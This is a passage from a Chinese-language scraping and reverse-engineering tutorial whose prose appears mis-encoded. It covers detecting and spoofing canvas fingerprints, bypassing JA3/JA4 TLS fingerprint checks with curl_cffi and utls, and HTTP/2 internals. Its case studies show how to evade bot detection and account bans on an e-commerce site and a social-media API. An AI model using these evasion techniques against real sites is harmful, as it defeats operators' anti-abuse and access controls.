<p><strong>å…³é”®ç‚¹</strong>: å³ä½¿ç»˜åˆ¶ç›¸åŒçš„å†…å®¹ï¼Œä¸åŒç¯å¢ƒæ¸²æŸ“å‡ºçš„åƒç´ å€¼ä¼šæœ‰å¾®å°å·®å¼‚ã€‚</p>
<hr />
<h2>æ£€æµ‹ Canvas æŒ‡çº¹</h2>
<h3>æ–¹æ³•ä¸€ï¼šç›‘æ§ API è°ƒç”¨</h3>
<pre><code class="language-javascript">// Hook toDataURL
const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
HTMLCanvasElement.prototype.toDataURL = function () {
  console.log(&quot;[Canvas] toDataURL called&quot;);
  console.trace();
  return originalToDataURL.apply(this, arguments);
};

// Hook getImageData
const originalGetImageData = CanvasRenderingContext2D.prototype.getImageData;
CanvasRenderingContext2D.prototype.getImageData = function () {
  console.log(&quot;[Canvas] getImageData called&quot;);
  console.trace();
  return originalGetImageData.apply(this, arguments);
};
</code></pre>
<h3>æ–¹æ³•äºŒï¼šåœ¨ DevTools ä¸­æŸ¥æ‰¾</h3>
<p>å…¨å±€æœç´¢å…³é”®è¯ï¼š</p>
<ul>
<li><code>toDataURL</code></li>
<li><code>getImageData</code></li>
<li><code>canvas</code></li>
<li><code>fingerprint</code></li>
</ul>
<hr />
<h2>å¯¹æŠ—æŠ€æœ¯</h2>
<h3>1. ç¦ç”¨ Canvasï¼ˆæç«¯æ–¹æ¡ˆï¼‰</h3>
<p>æŸäº›éšç§æµè§ˆå™¨ï¼ˆå¦‚ Tor Browserï¼‰ä¼šç¦ç”¨æˆ–é™åˆ¶ Canvasã€‚</p>
<p><strong>é—®é¢˜</strong>: ä¼šå¯¼è‡´ç½‘ç«™åŠŸèƒ½å¼‚å¸¸ã€‚</p>
<h3>2. Canvas Spoofingï¼ˆä¼ªé€ ï¼‰</h3>
<p><strong>åŸç†</strong>: ä¿®æ”¹ Canvas API è¿”å›å€¼ï¼Œç»™æ¯ä¸ªè¯·æ±‚è¿”å›ç¨å¾®ä¸åŒçš„æ•°æ®ã€‚</p>
<pre><code class="language-javascript">// ç®€å•çš„éšæœºå™ªç‚¹æ³¨å…¥
const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
HTMLCanvasElement.prototype.toDataURL = function (...args) {
  // è·å–åŸå§‹æ•°æ®
  const dataURL = originalToDataURL.apply(this, arguments);

  // æ³¨å…¥å™ªç‚¹ï¼ˆä¿®æ”¹å°‘é‡åƒç´ ï¼‰
  const canvas = this;
  const ctx = canvas.getContext(&quot;2d&quot;);
  const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
  const data = imageData.data;

  // éšæœºä¿®æ”¹ 0.01% çš„åƒç´ 
  for (let i = 0; i &lt; data.length; i += 4) {
    if (Math.random() &lt; 0.0001) {
      data[i] = Math.floor(Math.random() * 256); // R
      data[i + 1] = Math.floor(Math.random() * 256); // G
      data[i + 2] = Math.floor(Math.random() * 256); // B
    }
  }

  ctx.putImageData(imageData, 0, 0);
  return canvas.toDataURL();
};
</code></pre>
<p><strong>æµè§ˆå™¨æ’ä»¶</strong>:</p>
<ul>
<li><strong>Canvas Fingerprint Defender</strong></li>
<li><strong>Canvas Blocker</strong></li>
</ul>
<h3>3. ä½¿ç”¨æ— å¤´æµè§ˆå™¨</h3>
<p>Puppeteer/Selenium å¯ä»¥é€šè¿‡æ³¨å…¥è„šæœ¬ä¿®æ”¹ Canvas è¡Œä¸ºï¼š</p>
<pre><code class="language-javascript">// Puppeteer
await page.evaluateOnNewDocument(() =&gt; {
  const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL = function (...args) {
    // æ³¨å…¥å™ªç‚¹é€»è¾‘
    // ...
    return originalToDataURL.apply(this, arguments);
  };
});
</code></pre>
<hr />
<h2>æ£€æµ‹åçˆ¬è™«ä¸­çš„ Canvas æŒ‡çº¹</h2>
<h3>æ¡ˆä¾‹ï¼šæŸç”µå•†ç½‘ç«™</h3>
<p><strong>ç°è±¡</strong>: ç™»å½•åç«‹å³è¢«å°å·ï¼Œæç¤º&quot;æ£€æµ‹åˆ°å¼‚å¸¸è¡Œä¸º&quot;ã€‚</p>
<p><strong>åˆ†æ</strong>:</p>
<ol>
<li>åœ¨ Console Hook <code>toDataURL</code> å’Œ <code>getImageData</code></li>
<li>å‘ç°é¡µé¢åŠ è½½æ—¶è°ƒç”¨äº†å¤šæ¬¡ Canvas API</li>
<li>å®šä½åˆ° JS æ–‡ä»¶ï¼Œå‘ç°åœ¨ç”Ÿæˆè®¾å¤‡æŒ‡çº¹</li>
</ol>
<p><strong>ç»•è¿‡</strong>:</p>
<ul>
<li>ä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆChromeï¼‰è€Œé Headless</li>
<li>å®‰è£… Canvas Defender æ’ä»¶</li>
<li>æˆ–ä½¿ç”¨æŒ‡çº¹ä¼ªé€ åº“ï¼ˆå¦‚ FingerprintJS Spoofingï¼‰</li>
</ul>
<hr />
<h2>Canvas vs WebGL æŒ‡çº¹</h2>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>Canvas</th>
  <th>WebGL</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>åŸç†</strong></td>
  <td>2D å›¾å½¢æ¸²æŸ“å·®å¼‚</td>
  <td>3D å›¾å½¢æ¸²æŸ“å·®å¼‚</td>
</tr>
<tr>
  <td><strong>åŒºåˆ†åº¦</strong></td>
  <td>ä¸­</td>
  <td>é«˜</td>
</tr>
<tr>
  <td><strong>å®ç°éš¾åº¦</strong></td>
  <td>ä½</td>
  <td>ä¸­</td>
</tr>
<tr>
  <td><strong>å¸¸è§åœºæ™¯</strong></td>
  <td>é€šç”¨æŒ‡çº¹</td>
  <td>é«˜çº§æŒ‡çº¹</td>
</tr>
</tbody>
</table>
<hr />
<h2>ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="https://browserleaks.com/canvas">BrowserLeaks - Canvas Test</a></li>
<li><a href="https://amiunique.org/">AmIUnique - æŒ‡çº¹æµ‹è¯•</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-40">WebRTC æŒ‡çº¹ä¸éšç§</a></li>
<li><a href="#section-37">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-42">
                                                <h2>[R41] TLS Fingerprinting</h2>
                                                <h1>R41: TLS æŒ‡çº¹è¯†åˆ« (JA3/JA4)</h1>
<h2>ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>
<p>åœ¨å­¦ä¹  TLS æŒ‡çº¹ä¹‹å‰ï¼Œå…ˆæŒ‘æˆ˜ä½ çš„è®¤çŸ¥ï¼š</p>
<ol>
<li><strong>HTTPS å°±å®‰å…¨äº†å—ï¼Ÿ</strong> å³ä½¿ç”¨äº†åŠ å¯†ä¼ è¾“ï¼Œç½‘ç«™è¿˜èƒ½è¯†åˆ«å‡ºä½ æ˜¯çˆ¬è™«ï¼Ÿ</li>
<li><strong>æ¡æ‰‹çš„ç§˜å¯†ï¼š</strong> åœ¨ HTTPS è¿æ¥å»ºç«‹çš„ä¸€ç¬é—´ï¼Œæµè§ˆå™¨æš´éœ²äº†å“ªäº›ä¿¡æ¯ï¼Ÿ</li>
<li><strong>æŒ‡çº¹çš„ä¸å¯è§æ€§ï¼š</strong> ä½ ç”¨ Python requests å‘è¯·æ±‚ï¼ŒHTTP å¤´ä¼ªè£…å¾—å†åƒï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯è¢«è¯†åˆ«å‡ºæ¥ï¼Ÿ</li>
<li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> æŸç½‘ç«™å°ç¦äº†æ‰€æœ‰ Python requests çš„è®¿é—®ï¼ˆè¿”å› 403ï¼‰ï¼Œä½†ç”¨æµè§ˆå™¨è®¿é—®æ­£å¸¸ã€‚ä½ è¿ä¸€ä¸ªè¯·æ±‚éƒ½æ²¡å‘ï¼Œå®ƒæ˜¯æ€ä¹ˆçŸ¥é“çš„ï¼Ÿ</li>
</ol>
<p>TLS æŒ‡çº¹ï¼Œæ˜¯åº”ç”¨å±‚ä¹‹ä¸‹çš„&quot;æš—æˆ˜&quot;ã€‚</p>
<hr />
<h2>æ¦‚è¿°</h2>
<p>TLS æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯ä¼šå‘é€ä¸€ç³»åˆ—å‚æ•°ï¼ˆå¦‚æ”¯æŒçš„åŠ å¯†å¥—ä»¶ã€æ‰©å±•ç­‰ï¼‰ï¼Œè¿™äº›å‚æ•°çš„ç»„åˆå¯ä»¥ä½œä¸ºæŒ‡çº¹è¯†åˆ«å®¢æˆ·ç«¯ç±»å‹ã€‚JA3/JA4 æ˜¯ç›®å‰æœ€æµè¡Œçš„ TLS æŒ‡çº¹æŠ€æœ¯ã€‚</p>
<hr />
<h2>TLS æ¡æ‰‹å›é¡¾</h2>
<pre><code>Client -----&gt; ClientHello (åŒ…å«åŠ å¯†å¥—ä»¶ã€æ‰©å±•ç­‰) -----&gt; Server
Client &lt;----- ServerHello (é€‰æ‹©åŠ å¯†å¥—ä»¶)        &lt;----- Server
...
</code></pre>
<p><strong>ClientHello åŒ…å«çš„ä¿¡æ¯</strong>:</p>
<ul>
<li>TLS ç‰ˆæœ¬</li>
<li>æ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨</li>
<li>æ”¯æŒçš„å‹ç¼©æ–¹æ³•</li>
<li>æ‰©å±•ï¼ˆExtensionï¼‰åˆ—è¡¨</li>
</ul>
<hr />
<h2>JA3 æŒ‡çº¹</h2>
<h3>1. åŸç†</h3>
<p>JA3 å°† ClientHello ä¸­çš„å…³é”®å­—æ®µæ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œç„¶åè®¡ç®— MD5ã€‚</p>
<p><strong>å­—æ®µ</strong>:</p>
<pre><code>TLSç‰ˆæœ¬, åŠ å¯†å¥—ä»¶åˆ—è¡¨, æ‰©å±•åˆ—è¡¨, æ¤­åœ†æ›²çº¿åˆ—è¡¨, æ¤­åœ†æ›²çº¿ç‚¹æ ¼å¼
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code>771,49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-65281,23-24-25,0
</code></pre>
<p>è®¡ç®— MD5:</p>
<pre><code>JA3 = md5(&quot;771,49195-49199-...&quot;)
    = &quot;3b5074b1b5d032e5620f69f9f700ff0e&quot;
</code></pre>
<h3>2. ç”¨é€”</h3>
<p><strong>æœåŠ¡å™¨ç«¯</strong>:</p>
<ul>
<li>è¯†åˆ«å®¢æˆ·ç«¯ç±»å‹ï¼ˆæµè§ˆå™¨ vs è„šæœ¬ï¼‰</li>
<li>å°ç¦ç‰¹å®šå®¢æˆ·ç«¯ï¼ˆå¦‚ Python requests çš„ JA3ï¼‰</li>
</ul>
<p><strong>æ”»å‡»è€…</strong>:</p>
<ul>
<li>ä¼ªé€ æµè§ˆå™¨çš„ TLS æŒ‡çº¹</li>
</ul>
<hr />
<h2>JA3 æ£€æµ‹</h2>
<h3>åœ¨çº¿å·¥å…·</h3>
<ul>
<li><a href="https://tls.peet.ws/api/clean">tls.peet.ws</a> - æŸ¥çœ‹è‡ªå·±çš„ JA3</li>
<li><a href="https://ja3er.com/">JA3er</a> - JA3 æ•°æ®åº“</li>
</ul>
<h3>Wireshark æŠ“åŒ…</h3>
<ol>
<li>æ•è· HTTPS æµé‡</li>
<li>è¿‡æ»¤ <code>ssl.handshake.type == 1</code> (ClientHello)</li>
<li>æŸ¥çœ‹ <code>Cipher Suites</code> å’Œ <code>Extensions</code></li>
</ol>
<hr />
<h2>JA3 ä¼ªé€ </h2>
<h3>æ–¹æ³•ä¸€ï¼šä½¿ç”¨æ”¯æŒ TLS æŒ‡çº¹çš„åº“</h3>
<p><strong>Python - curl_cffi</strong>:</p>
<pre><code class="language-python">from curl_cffi import requests

# æ¨¡æ‹Ÿ Chrome
response = requests.get('https://tls.peet.ws/api/clean', impersonate='chrome110')
print(response.text)
</code></pre>
<p><strong>Go - utls</strong>:</p>
<pre><code class="language-go">import &quot;github.com/refraction-networking/utls&quot;

config := &amp;utls.Config{
    ServerName: &quot;example.com&quot;,
}
conn := utls.UClient(tcpConn, config, utls.HelloChrome_Auto)
</code></pre>
<h3>æ–¹æ³•äºŒï¼šä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆRPCï¼‰</h3>
<p>é€šè¿‡ Puppeteer/Playwright æ§åˆ¶çœŸå®æµè§ˆå™¨ï¼Œå¤©ç„¶å…·æœ‰æ­£ç¡®çš„ TLS æŒ‡çº¹ã€‚</p>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);

(async () =&gt; {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto(&quot;https://example.com&quot;);
  const content = await page.content();
  console.log(content);
  await browser.close();
})();
</code></pre>
<hr />
<h2>JA4 - ä¸‹ä¸€ä»£æŒ‡çº¹</h2>
<h3>ä¸ JA3 çš„åŒºåˆ«</h3>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>JA3</th>
  <th>JA4</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ ¼å¼</strong></td>
  <td>MD5 å“ˆå¸Œ</td>
  <td>äººç±»å¯è¯»å­—ç¬¦ä¸²</td>
</tr>
<tr>
  <td><strong>åè®®æ”¯æŒ</strong></td>
  <td>TLS 1.0-1.3</td>
  <td>TLS 1.0-1.3, QUIC</td>
</tr>
<tr>
  <td><strong>ç»†ç²’åº¦</strong></td>
  <td>ä¸­</td>
  <td>é«˜</td>
</tr>
<tr>
  <td><strong>å¯è¯»æ€§</strong></td>
  <td>ä½ï¼ˆå“ˆå¸Œï¼‰</td>
  <td>é«˜ï¼ˆåˆ†æ®µå­—ç¬¦ä¸²ï¼‰</td>
</tr>
</tbody>
</table>
<p><strong>JA4 ç¤ºä¾‹</strong>:</p>
<pre><code>t13d1516h2_8daaf6152771_e5627efa2ab1
</code></pre>
<ul>
<li><code>t13</code>: TLS 1.3</li>
<li><code>d15</code>: åŠ å¯†å¥—ä»¶æ•°é‡</li>
<li><code>16</code>: æ‰©å±•æ•°é‡</li>
<li><code>h2</code>: ALPN (HTTP/2)</li>
</ul>
<hr />
<h2>ç»•è¿‡ TLS æŒ‡çº¹æ£€æµ‹</h2>
<h3>1. ä½¿ç”¨æ¨¡æ‹Ÿåº“</h3>
<p>é€‰æ‹©æ”¯æŒè‡ªå®šä¹‰ TLS æŒ‡çº¹çš„ HTTP åº“ï¼š</p>
<ul>
<li><code>curl_cffi</code> (Python)</li>
<li><code>utls</code> (Go)</li>
<li><code>tls-client</code> (Python wrapper for Go utls)</li>
</ul>
<h3>2. é¢‘ç¹æ›´æ¢æŒ‡çº¹</h3>
<p>å³ä½¿è¢«è¯†åˆ«ï¼Œä¹Ÿå¯ä»¥è½®æ¢ä¸åŒçš„æµè§ˆå™¨æŒ‡çº¹ï¼ˆChrome/Firefox/Safariï¼‰ã€‚</p>
<h3>3. ä½¿ç”¨ä½å®…ä»£ç†</h3>
<p>é«˜è´¨é‡ä½å®…ä»£ç†é€šå¸¸ä¼šä¿ç•™çœŸå®ç”¨æˆ·çš„ TLS ç‰¹å¾ã€‚</p>
<hr />
<h2>æ£€æµ‹ç½‘ç«™æ˜¯å¦ä½¿ç”¨ TLS æŒ‡çº¹</h2>
<p><strong>æ–¹æ³•</strong>:</p>
<ol>
<li>ç”¨ <code>requests</code> åº“å’ŒçœŸå®æµè§ˆå™¨åˆ†åˆ«è®¿é—®åŒä¸€æ¥å£</li>
<li>å¦‚æœ <code>requests</code> è¿”å› 403/401ï¼Œæµè§ˆå™¨æ­£å¸¸ï¼Œå¯èƒ½æ˜¯ TLS æŒ‡çº¹æ£€æµ‹</li>
</ol>
<p><strong>éªŒè¯</strong>:</p>
<pre><code class="language-python">import requests

# Python requests çš„ TLS æŒ‡çº¹
response = requests.get('https://tls.peet.ws/api/clean')
print(response.json())  # æŸ¥çœ‹ JA3
</code></pre>
<p>å¯¹æ¯”æµè§ˆå™¨è®¿é—® <code>https://tls.peet.ws/api/clean</code> çš„ç»“æœã€‚</p>
<hr />
<h2>å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ï¼šæŸç¤¾äº¤åª’ä½“ API</h3>
<p><strong>ç°è±¡</strong>: Python requests è¯·æ±‚è¿”å› 403ï¼Œæµè§ˆå™¨æ­£å¸¸ã€‚</p>
<p><strong>åˆ†æ</strong>:</p>
<ol>
<li>æ£€æŸ¥ User-Agent - å·²ä¼ªé€ ï¼Œä»ç„¶å¤±è´¥</li>
<li>æ£€æŸ¥ Cookie - å·²æºå¸¦ï¼Œä»ç„¶å¤±è´¥</li>
<li>æ€€ç–‘ TLS æŒ‡çº¹</li>
</ol>
<p><strong>è§£å†³</strong>:</p>
<pre><code class="language-python">from curl_cffi import requests

# ä½¿ç”¨ curl_cffi æ¨¡æ‹Ÿ Chrome çš„ TLS æŒ‡çº¹
response = requests.get(
    'https://api.socialmedia.com/user/info',
    headers={'User-Agent': 'Mozilla/5.0 ...'},
    cookies={'session': 'xxx'},
    impersonate='chrome110'
)
print(response.text)  # æˆåŠŸï¼
</code></pre>
<hr />
<h2>ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="https://github.com/salesforce/ja3">JA3 - Salesforce</a></li>
<li><a href="https://github.com/FoxIO-LLC/ja4">JA4+ Network Fingerprinting</a></li>
<li><a href="https://github.com/lwthiker/curl-impersonate">curl-impersonate</a></li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-43">HTTP/2 ä¸ HTTP/3</a></li>
<li><a href="#section-37">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-43">
                                                <h2>[R42] HTTP/2 & HTTP/3</h2>
                                                <h1>R42: HTTP/2 ä¸ HTTP/3</h1>
<h2>æ¦‚è¿°</h2>
<p>HTTP/2 å’Œ HTTP/3 æ˜¯ HTTP åè®®çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¸¦æ¥äº†æ€§èƒ½æå‡å’Œæ–°çš„ç‰¹æ€§ã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œç†è§£è¿™äº›åè®®çš„å·¥ä½œåŸç†å¯¹äºåˆ†æç°ä»£ Web åº”ç”¨è‡³å…³é‡è¦ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¦å­¦ä¹  HTTP/2 å’Œ HTTP/3ï¼Ÿ</strong></p>
<ol>
<li><strong>ç°ä»£ç½‘ç«™çš„æ ‡å‡†</strong>: å¤§éƒ¨åˆ†ä¸»æµç½‘ç«™å·²è¿ç§»åˆ° HTTP/2ï¼ŒHTTP/3 ä¹Ÿåœ¨å¿«é€Ÿæ™®åŠ</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>: å¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ç­‰ç‰¹æ€§æ”¹å˜äº†è¯·æ±‚æ¨¡å¼</li>
<li><strong>é€†å‘éš¾åº¦å¢åŠ </strong>: äºŒè¿›åˆ¶åè®®ã€åŠ å¯†ä¼ è¾“å¢åŠ äº†åˆ†æéš¾åº¦</li>
<li><strong>æŒ‡çº¹è¯†åˆ«</strong>: TLS æŒ‡çº¹å’Œåè®®ç‰¹å¾å¯ç”¨äºæ£€æµ‹è‡ªåŠ¨åŒ–å·¥å…·</li>
</ol>
<hr />
<h2>1. HTTP/1.x çš„å±€é™æ€§</h2>
<h3>1.1 é˜Ÿå¤´é˜»å¡ (Head-of-Line Blocking)</h3>
<p><strong>é—®é¢˜</strong>: HTTP/1.1 åœ¨å•ä¸ª TCP è¿æ¥ä¸Šä¸€æ¬¡åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚</p>
<pre><code>è¯·æ±‚1: |========== å“åº” ==========|
è¯·æ±‚2:                              |===== å“åº” =====|
è¯·æ±‚3:                                                |== å“åº” ==|
</code></pre>
<p><strong>å½±å“</strong>: å‰é¢çš„æ…¢è¯·æ±‚ä¼šé˜»å¡åé¢çš„æ‰€æœ‰è¯·æ±‚</p>
<p><strong>å˜é€šæ–¹æ¡ˆ</strong> (HTTP/1.1):</p>
<ul>
<li><strong>Pipeline</strong>: å‘é€å¤šä¸ªè¯·æ±‚ä½†ä»æŒ‰é¡ºåºå“åº”ï¼ˆæµè§ˆå™¨é»˜è®¤ç¦ç”¨ï¼‰</li>
<li><strong>Domain Sharding</strong>: ä½¿ç”¨å¤šä¸ªåŸŸåå¢åŠ å¹¶å‘è¿æ¥æ•°</li>
<li><strong>è¿æ¥å¤ç”¨</strong>: ä¿æŒè¿æ¥ (Keep-Alive)</li>
</ul>
<p><strong>é™åˆ¶</strong>: æµè§ˆå™¨é€šå¸¸é™åˆ¶æ¯ä¸ªåŸŸåæœ€å¤š 6 ä¸ªå¹¶å‘è¿æ¥</p>
<hr />
<h3>1.2 å¤´éƒ¨å†—ä½™</h3>
<p><strong>é—®é¢˜</strong>: æ¯ä¸ªè¯·æ±‚éƒ½é‡å¤å‘é€ç›¸åŒçš„ HTTP å¤´éƒ¨</p>
<pre><code class="language-http">GET /api/data?id=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...
Accept: application/json
Cookie: session=abc123...
</code></pre>
<pre><code class="language-http">GET /api/data?id=2 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...        &lt;-- é‡å¤
Accept: application/json          &lt;-- é‡å¤
Cookie: session=abc123...         &lt;-- é‡å¤
</code></pre>
<p><strong>å½±å“</strong>: å¸¦å®½æµªè´¹ï¼Œå°¤å…¶æ˜¯ç§»åŠ¨ç½‘ç»œ</p>
<hr />
<h3>1.3 æ˜æ–‡åè®®</h3>
<p><strong>é—®é¢˜</strong>: HTTP/1.x æœ¬èº«ä¸å¼ºåˆ¶åŠ å¯†</p>
<p><strong>å®‰å…¨é£é™©</strong>:</p>
<ul>
<li>ä¸­é—´äººæ”»å‡»</li>
<li>æµé‡å—…æ¢</li>
<li>å†…å®¹ç¯¡æ”¹</li>
</ul>
<hr />
<h2>2. HTTP/2 è¯¦è§£</h2>
<h3>2.1 æ ¸å¿ƒç‰¹æ€§</h3>
<h4>2.1.1 äºŒè¿›åˆ¶åˆ†å¸§ (Binary Framing)</h4>
<p><strong>HTTP/1.x</strong>: åŸºäºæ–‡æœ¬ï¼Œä½¿ç”¨æ¢è¡Œç¬¦åˆ†éš”</p>
<pre><code>GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
\r\n
</code></pre>
<p><strong>HTTP/2</strong>: åŸºäºäºŒè¿›åˆ¶å¸§</p>
<pre><code>+-----------------------------------------------+
|                 Frame Header                   |
+-----------------------------------------------+
| Length (24) | Type (8) | Flags (8) | R |Stream|
+-----------------------------------------------+
|                 Frame Payload                  |
+-----------------------------------------------+
</code></pre>
<p><strong>å¸§ç±»å‹</strong>:</p>
<ul>
<li><code>HEADERS</code>: HTTP å¤´éƒ¨</li>
<li><code>DATA</code>: æ¶ˆæ¯ä½“</li>
<li><code>PRIORITY</code>: ä¼˜å…ˆçº§</li>
<li><code>RST_STREAM</code>: é‡ç½®æµ</li>
<li><code>SETTINGS</code>: è¿æ¥è®¾ç½®</li>
<li><code>PUSH_PROMISE</code>: æœåŠ¡å™¨æ¨é€</li>
<li><code>PING</code>: å¿ƒè·³æ£€æµ‹</li>
<li><code>GOAWAY</code>: è¿æ¥å…³é—­</li>
<li><code>WINDOW_UPDATE</code>: æµé‡æ§åˆ¶</li>
<li><code>CONTINUATION</code>: å¤´éƒ¨å»¶ç»­</li>
</ul>
<p><strong>é€†å‘å½±å“</strong>:</p>
<ul>
<li>âœ… <strong>æ›´é«˜æ•ˆ</strong>: è§£æé€Ÿåº¦å¿«</li>
<li>âŒ <strong>ä¸å¯è¯»</strong>: æ— æ³•ç›´æ¥ç”¨ <code>cat</code> æŸ¥çœ‹</li>
<li>ğŸ› ï¸ <strong>éœ€è¦å·¥å…·</strong>: Wiresharkã€Chrome DevTools</li>
</ul>
<hr />
<h4>2.1.2 å¤šè·¯å¤ç”¨ (Multiplexing)</h4>
<p><strong>åŸç†</strong>: åœ¨å•ä¸ª TCP è¿æ¥ä¸Šå¹¶å‘å¤šä¸ª HTTP æµ (Streams)</p>
<pre><code>TCP è¿æ¥
|
â”œâ”€â”€ Stream 1: GET /css/style.css
â”œâ”€â”€ Stream 3: GET /js/app.js
â”œâ”€â”€ Stream 5: GET /img/logo.png
â””â”€â”€ Stream 7: POST /api/submit
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li><strong>æ¶ˆé™¤é˜Ÿå¤´é˜»å¡</strong>: è¯·æ±‚å’Œå“åº”ä¸å†ç›¸äº’é˜»å¡</li>
<li><strong>å‡å°‘è¿æ¥æ•°</strong>: ä¸€ä¸ªåŸŸååªéœ€ä¸€ä¸ªè¿æ¥</li>
<li><strong>é™ä½å»¶è¿Ÿ</strong>: åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚</li>
</ul>
<p><strong>é€†å‘å½±å“</strong>:</p>
<ul>
<li>Network é¢æ¿ä¸­è¯·æ±‚é¡ºåºä¸å®é™…å‘é€é¡ºåºå¯èƒ½ä¸åŒ</li>
<li>æ— æ³•é€šè¿‡è¯·æ±‚é¡ºåºåˆ¤æ–­é€»è¾‘æµç¨‹</li>
<li>éœ€è¦å…³æ³¨ Stream ID è€Œéæ—¶é—´æˆ³</li>
</ul>
<p><strong>Chrome DevTools ä¸­æŸ¥çœ‹</strong>:</p>
<ol>
<li>æ‰“å¼€ Network é¢æ¿</li>
<li>å³é”®è¡¨å¤´ â†’ å‹¾é€‰ &quot;Protocol&quot;</li>
<li>æŸ¥çœ‹åè®®åˆ—æ˜¾ç¤º <code>h2</code>ï¼ˆHTTP/2ï¼‰</li>
</ol>
<hr />
<h4>2.1.3 å¤´éƒ¨å‹ç¼© (HPACK)</h4>
<p><strong>åŸç†</strong>: ä½¿ç”¨ä¸“ç”¨å‹ç¼©ç®—æ³•ï¼ˆHPACKï¼‰å’Œé™æ€/åŠ¨æ€è¡¨</p>
<p><strong>é™æ€è¡¨</strong> (å¸¸è§å¤´éƒ¨é¢„å®šä¹‰):</p>
<pre><code>Index | Header Name     | Header Value
------+-----------------+-------------
1     | :authority      |
2     | :method         | GET
3     | :method         | POST
4     | :path           | /
5     | :path           | /index.html
...
</code></pre>
<p><strong>åŠ¨æ€è¡¨</strong> (ä¼šè¯ä¸­å‡ºç°çš„å¤´éƒ¨):</p>
<pre><code>62 | cookie: session=abc123
63 | user-agent: Mozilla/5.0...
</code></pre>
<p><strong>ç¼–ç ç¤ºä¾‹</strong>:</p>
<pre><code class="language-http"># åŸå§‹å¤´éƒ¨
:method: GET
:path: /api/user
cookie: session=abc123

# HPACK ç¼–ç  (ç®€åŒ–è¡¨ç¤º)
82          # :method GET (é™æ€è¡¨ç´¢å¼• 2)
84          # :path /api/user (å­—é¢é‡)
BE          # cookie: session=abc123 (åŠ¨æ€è¡¨ç´¢å¼• 62)
</code></pre>
<p><strong>å‹ç¼©ç‡</strong>: é€šå¸¸å¯è¾¾ 70-90%</p>
<p><strong>é€†å‘éš¾ç‚¹</strong>:</p>
<ul>
<li>å¤´éƒ¨æ˜¯åŠ¨æ€å‹ç¼©çš„ï¼Œæ— æ³•ç›´æ¥è§£æ</li>
<li>éœ€è¦ç»´æŠ¤ä¼šè¯çŠ¶æ€æ‰èƒ½æ­£ç¡®è§£ç </li>
<li>å·¥å…·æ”¯æŒ: Wireshark è‡ªåŠ¨è§£å‹</li>
</ul>
<hr />
<h4>2.1.4 æœåŠ¡å™¨æ¨é€ (Server Push)</h4>
<p><strong>åŸç†</strong>: æœåŠ¡å™¨ä¸»åŠ¨æ¨é€å®¢æˆ·ç«¯æœªè¯·æ±‚çš„èµ„æº</p>
<p><strong>æµç¨‹</strong>:</p>
<pre><code>å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: GET /index.html

æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: PUSH_PROMISE stream=2 (æ¨é€ /style.css)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: HEADERS stream=1 (å“åº” index.html)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: DATA stream=1 (&lt;html&gt;...)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: HEADERS stream=2 (å“åº” style.css)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: DATA stream=2 (body { ... })
</code></pre>
<p><strong>å¥½å¤„</strong>:</p>
<ul>
<li>å‡å°‘å¾€è¿”å»¶è¿Ÿ (RTT)</li>
<li>æå‰åŠ è½½å…³é”®èµ„æº</li>
</ul>
<p><strong>é€†å‘æ³¨æ„</strong>:</p>
<ul>
<li>Network é¢æ¿ä¸­çœ‹åˆ° <code>Push</code> æ ‡è®°</li>
<li>å¯èƒ½çœ‹åˆ°æœªå‘èµ·è¯·æ±‚çš„èµ„æºåŠ è½½</li>
</ul>
<hr />
<h4>2.1.5 æµé‡æ§åˆ¶ (Flow Control)</h4>
